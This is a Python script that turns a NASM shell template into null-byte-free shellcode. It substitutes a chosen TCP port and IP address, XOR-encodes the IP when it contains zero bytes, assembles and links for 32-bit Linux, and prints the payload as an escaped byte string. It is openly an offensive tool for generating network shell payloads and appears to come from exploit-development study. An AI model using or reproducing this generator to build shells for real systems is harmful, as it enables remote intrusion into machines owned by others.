import os
import sys
import argparse
import traceback
import subprocess
import random


def print_shellcode(object_file_path):

    try:
        command = ["objcopy", "-O", "binary", "-j", ".text", object_file_path, "/dev/stdout"]
        proc = subprocess.run(command, stdout=subprocess.PIPE)
    except:
        print(traceback.format_exc())
        sys.exit(1)
    
    shellcode = proc.stdout
    shellcode_string = ""
    for b in shellcode:
        shellcode_string += f"\\x{b:02x}"

    if 0x00 in shellcode:
        print(f"[!] Found NULL byte in shellcode")

    print(f"[+] Shellcode length: {len(shellcode)} bytes")
    print(f"[+] Shellcode:")
    print(f'"{shellcode_string}";')


def generate_shellcode(output_file_path):

    object_file_path = output_file_path.replace(".nasm", ".o", 1)
    executable_path = output_file_path.replace(".nasm", "", 1)

    try:
        os.system(f"nasm -f elf32 -o {object_file_path} {output_file_path}")
        os.system(f"ld -m elf_i386 -o {executable_path} {object_file_path}")

        print(f"[+] Object file generated at {output_file_path}")
        print(f"[+] Executable binary generated at {executable_path}")

        print_shellcode(object_file_path)
    except:
        print(traceback.format_exc())
        sys.exit(1)

def replace_template_values(template_name, tcp_port, ip_address, output_file_path):

    with open(template_name) as f:
        template_code = f.read()

    tcp_port_hex = (tcp_port).to_bytes(2, "little").hex()

    if '00' in tcp_port_hex:
        if '00' in tcp_port_hex[:2]:
            non_null_byte = tcp_port_hex[2:]
            replace_code = f"mov bl, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
        else:
            non_null_byte = tcp_port_hex[:2]
            replace_code = f"mov bh, 0x{non_null_byte}\n    push bx\n    xor ebx, ebx"
    else:
        replace_code = f"push WORD 0x{tcp_port_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_PORT }}", replace_code, 1)

    ip_address_bytes = [int(x) for x in ip_address.split(".")][::-1]
    

    if 0 in ip_address_bytes:
        print("[!] Found NULL byte in IP address")

        # choose a random byte from the range(1,256), excluding the bytes that make up the IP address
        random_xor_byte = random.choice(list(set(range(1,256)) - set(ip_address_bytes)))

        # encode XORing DWORD and XORed DWORD to hexadecimal
        xor_dword = (bytes([random_xor_byte]) * 4).hex()
        ip_address_xored_bytes = bytes([x ^ random_xor_byte for x in ip_address_bytes]).hex()

        replace_code = f"mov ebx, 0x{ip_address_xored_bytes}\n    xor ebx, 0x{xor_dword}\n    push ebx\n    xor ebx, ebx"

    else:
        ip_address_hex = "".join([(x).to_bytes(1, "little").hex() for x in ip_address_bytes])
        replace_code = f"push 0x{ip_address_hex}"
    
    template_code = template_code.replace("{{ TEMPLATE_TCP_IP }}", replace_code, 1)
    
    with open(output_file_path, 'w') as f:
        f.write(template_code)

def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', type=int, help='TCP Port of the Bind Shell', required=True, metavar="[1-65535]")
    parser.add_argument('-ip', "--ip", help="IP address of the Bind Shell", required=True)
    parser.add_argument('-t', '--template', help='Path of the NASM template file. Example: -t /tmp/template.nasm', required=True)
    parser.add_argument('-o', '--output', help='Path of the output file. Example: -o /tmp/output.nasm', required=True)

    args = parser.parse_args()

    ip_address = args.ip
    tcp_port = args.port

    if tcp_port not in range(1, 65536):
        print(f"[!] Argument '--port' must be in range [1-65535]")
        sys.exit(1)

    shellcode_template = args.template
    output_file_path = args.output

    replace_template_values(shellcode_template, tcp_port, ip_address, output_file_path)
    generate_shellcode(output_file_path)


if __name__ == '__main__':

    main()
